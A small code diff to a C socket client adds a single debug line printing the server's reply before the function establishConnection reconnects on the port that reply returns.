@@ -119,6 +119,7 @@ int establishConnection(int port, int shell) {
         //server and run establishConnection again with the result
         write(sock , "none\n" , strlen("none\n"));
         valread = read( sock , buffer, 1024);
+        printf("%s", buffer);
         establishConnection(atoi(buffer), 1);
     }
     return 0;
